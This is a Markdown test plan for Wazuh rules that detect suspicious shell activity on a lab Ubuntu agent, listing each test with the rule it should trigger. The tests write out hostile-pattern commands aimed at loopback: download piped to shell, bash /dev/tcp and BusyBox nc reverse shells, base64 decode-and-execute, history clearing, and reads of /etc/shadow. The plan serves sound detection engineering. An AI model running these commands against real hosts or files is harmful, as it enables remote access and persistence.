# Unix Shell Detection Commands

## Rule file

```text
rules/unix_shell_detection.xml
```

Run these commands individually on the approved Ubuntu lab agent. The tests
expect normalized auditd EXECVE telemetry from:

```text
/var/log/wazuh-audit-exec.json
```

Historical Linux agent ID: `003`. Verify it is active before testing.

## Preflight

```bash
whoami
hostname
sudo auditctl -s
sudo auditctl -l
systemctl is-active auditd wazuh-agent
pgrep -af '^python3 /usr/local/sbin/wazuh-audit-exec-json'
```

Expected audit state includes:

```text
lost 0
backlog 0
key=wazuh_shell_exec
```

Level-0 telemetry parent used by every test:

```text
100201 — normalized JSON execution parent
```

The unused raw-audit rule `100200` was removed; this rule family consumes only
the dispatcher's normalized JSON fields.

## Test matrix

| Test | Behavior | Expected rule |
|---|---|---:|
| U01 | Bash command execution | 100202 |
| U02 | Remote retrieval | 100203 |
| U03 | Download piped to shell | 100220 |
| U04 | Bounded reverse-shell pattern | 100221 |
| U05 | Decode then execute | 100222 |
| U06 | History clearing | 100204 |
| U07 | Shell-profile modification | 100223 |
| U08 | `authorized_keys` modification | 100224 |
| U09 | Sudoers modification | 100225 |
| U10 | Crontab modification attempt | 100226 |
| U11 | Add executable permission | 100205 |
| U12 | Decode without execution | 100206 |
| U13 | Execute script from `/tmp` | 100207 |
| U14 | Read `/etc/shadow` | 100208 |
| U15 | Netcat execution | 100209 |
| BB01/BB02 | BusyBox shell applet | 100210 |
| BB03 | BusyBox download-to-shell | 100220 |
| BB04 | BusyBox reverse-shell pattern | 100221 |
| BB05 | BusyBox temporary execution | 100207 |

## U01 — shell baseline

```bash
bash -c 'echo WAZUH_U01_BASELINE'
```

Expected: `100202`, level 3.

## U02 — remote retrieval

Loopback port 9 should fail closed.

```bash
bash -c 'curl -fsS http://127.0.0.1:9/WAZUH_U02_DOWNLOAD -o /tmp/WAZUH_U02_DOWNLOAD 2>/dev/null || true; rm -f /tmp/WAZUH_U02_DOWNLOAD; echo WAZUH_U02_DOWNLOAD'
```

Expected: `100203`, level 7.

## U03 — download piped to shell

No content should be returned by loopback port 9.

```bash
bash -c 'curl -fsS http://127.0.0.1:9/WAZUH_U03_DL_EXEC 2>/dev/null | sh; echo WAZUH_U03_DL_EXEC'
```

Expected: `100220`, level 12.

## U04 — bounded reverse-shell pattern

The connection targets loopback port 9 and is killed after two seconds.

```bash
bash -c "timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1' 2>/dev/null || true; echo WAZUH_U04_REVERSE_SHELL"
```

Expected: `100221`, level 12.

## U05 — decode then execute

Encoded payload: `echo WAZUH_U05_DECODE_EXEC_PAYLOAD`.

```bash
bash -c 'printf %s ZWNobyBXQVpVSF9VMDVfREVDT0RFX0VYRUNfUEFZTE9BRAo= | base64 -d | sh; echo WAZUH_U05_DECODE_EXEC'
```

Expected: `100222`, level 11.

## U06 — ephemeral shell-history clear

Runs in a disposable non-interactive shell.

```bash
bash -c 'history -c; echo WAZUH_U06_HISTORY'
```

Expected: `100204`, level 8.

## U07 — temporary shell-profile marker

```bash
bash -c 'printf "# WAZUH_U07_PROFILE\n" >> /tmp/WAZUH_U07_PROFILE.bashrc; rm -f /tmp/WAZUH_U07_PROFILE.bashrc; echo WAZUH_U07_PROFILE'
```

Expected: `100223`, level 10.

## U08 — temporary `authorized_keys` marker

```bash
bash -c 'printf "WAZUH_U08_SSHKEY\n" >> /tmp/authorized_keys; rm -f /tmp/authorized_keys; echo WAZUH_U08_SSHKEY'
```

Expected: `100224`, level 10.

## U09 — temporary sudoers marker

```bash
bash -c 'printf "# WAZUH_U09_SUDOERS\n" | tee /tmp/sudoers >/dev/null; rm -f /tmp/sudoers; echo WAZUH_U09_SUDOERS'
```

Expected: `100225`, level 10.

## U10 — failed crontab installation

The referenced file does not exist.

```bash
bash -c 'crontab /tmp/WAZUH_U10_CRON_DOES_NOT_EXIST 2>/dev/null || true; echo WAZUH_U10_CRON'
```

Expected: `100226`, level 9.

## U11 — executable-permission modification

```bash
bash -c 'f=/tmp/WAZUH_U11_CHMOD; printf "#!/bin/sh\nexit 0\n" > "$f"; chmod +x "$f"; chmod -x "$f"; rm -f "$f"; echo WAZUH_U11_CHMOD'
```

Expected: `100205`, level 7.

## U12 — Base64 decoding without execution

```bash
bash -c 'printf %s V0FaVUhfVTEyX0JBU0U2NF9EQVRB | base64 -d >/dev/null; echo WAZUH_U12_BASE64'
```

Expected: `100206`, level 6.

## U13 — execute temporary shell script

```bash
printf '#!/bin/sh\necho WAZUH_U13_TEMP_EXEC\n' > /tmp/WAZUH_U13_TEMP_EXEC.sh
/bin/sh /tmp/WAZUH_U13_TEMP_EXEC.sh
rm -f /tmp/WAZUH_U13_TEMP_EXEC.sh
```

Expected: `100207`, level 8.

## U14 — credential-file access

Reads only the root record and prints no content.

```bash
sudo grep -q '^root:' /etc/shadow
echo WAZUH_U14_SHADOW
```

Expected: `100208`, level 9.

## U15 — network utility

```bash
bash -c 'nc -z 127.0.0.1 9 2>/dev/null || true; echo WAZUH_U15_NETCAT'
```

Expected: `100209`, level 6.

## BusyBox coverage

### BB01 — BusyBox `sh`

```bash
busybox sh -c 'echo WAZUH_BB01_SH'
```

Expected: `100210`, level 5.

### BB02 — BusyBox `ash`

```bash
busybox ash -c 'echo WAZUH_BB02_ASH'
```

Expected: `100210`, level 5.

### BB03 — BusyBox download-to-shell

```bash
busybox sh -c 'busybox wget -qO- http://127.0.0.1:9/WAZUH_BB03 2>/dev/null | busybox sh; echo WAZUH_BB03'
```

Expected: `100220`, level 12.

### BB04 — BusyBox reverse-shell syntax

```bash
busybox sh -c 'timeout 2 busybox nc 127.0.0.1 9 -e /bin/sh 2>/dev/null || true; echo WAZUH_BB04'
```

Expected: `100221`, level 12.

### BB05 — BusyBox temporary execution

```bash
printf '#!/bin/sh\necho WAZUH_BB05\n' > /tmp/WAZUH_BB05.sh
busybox sh /tmp/WAZUH_BB05.sh
rm -f /tmp/WAZUH_BB05.sh
```

Expected: `100207`, level 8.

## False-positive controls

```bash
crontab -l 2>/dev/null || true
base64 --version >/dev/null
chmod 0644 /tmp 2>/dev/null || true
curl --version >/dev/null
grep -q WAZUH_MARKER ~/.bashrc 2>/dev/null || true
busybox echo WAZUH_BBN1
busybox wget --help >/dev/null 2>&1
```

Expected:

```text
No 100226 for crontab -l
No 100206/100222 for base64 --version
No 100205 for chmod 0644
No 100203/100220 for curl --version
No 100223 for .bashrc read
No 100210 for busybox echo
```

## Cleanup

```bash
rm -f \
  /tmp/WAZUH_U02_DOWNLOAD \
  /tmp/WAZUH_U07_PROFILE.bashrc \
  /tmp/authorized_keys \
  /tmp/sudoers \
  /tmp/WAZUH_U11_CHMOD \
  /tmp/WAZUH_U13_TEMP_EXEC.sh \
  /tmp/WAZUH_BB05.sh
```

## Dashboard filter

```text
agent.id:003 AND rule.id:(100202 OR 100203 OR 100204 OR 100205 OR 100206 OR 100207 OR 100208 OR 100209 OR 100210 OR 100220 OR 100221 OR 100222 OR 100223 OR 100224 OR 100225 OR 100226)
```

## Historical PASS matrix

All positive tests above passed live validation. See:

```text
tests/results/unix_shell_validation_2026-07-19.md
```
